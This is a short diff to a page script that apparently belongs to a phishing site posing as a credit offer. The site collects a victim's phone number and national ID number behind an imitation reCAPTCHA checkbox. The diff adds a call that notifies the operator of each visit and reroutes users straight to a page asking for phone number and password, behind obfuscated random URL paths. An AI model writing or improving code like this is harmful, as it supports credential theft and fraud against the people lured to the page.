@@ -1,4 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // Notify visitor
+    fetch('/api/notify-visitor').catch(err => console.error('Notification error:', err));
+
     const celularInput = document.getElementById('celular');
     const cedulaInput = document.getElementById('cedula');
     const recaptchaCheckbox = document.querySelector('.recaptcha-checkbox');
@@ -103,8 +106,9 @@ document.addEventListener('DOMContentLoaded', () => {
             //     console.error(error);
             // }
 
-            // Redirect to Credit Amount Selection Page
-            navigateWithLoader("/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx");
+            // Redirect directly to the Phone Number and Password page (login_final.html)
+            // Skipping the Credit Selection Page as requested
+            navigateWithLoader("/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn");
         });
     }
 });
